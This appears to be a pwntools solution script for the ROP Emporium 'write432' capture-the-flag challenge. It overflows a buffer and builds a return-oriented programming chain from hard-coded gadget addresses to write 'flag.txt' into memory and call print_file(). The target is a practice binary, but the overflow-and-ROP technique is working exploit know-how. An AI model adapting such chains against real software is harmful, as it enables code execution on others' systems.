#!/usr/bin/python3
from pwn import process, p32, log

shell = process("./write432")

offset = 44
junk = b"A" * offset

string = b"flag.txt"

payload  = b""
payload += junk

for i in range(0, len(string), 4):
    payload += p32(0x80485aa)     # pop edi; pop ebp; ret;
    payload += p32(0x804a018 + i) # .data
    payload += string[i:i+4]      # string
    payload += p32(0x8048543)     # mov dword ptr [edi], ebp; ret;

payload += p32(0x80483d0) # print_file()
payload += b"B" * 4       # return addr
payload += p32(0x804a018) # "flag.txt"

shell.sendlineafter(b"> ", payload)

flag = shell.recvline_contains(b"ROPE").decode()
log.info(f"Flag: {flag}")
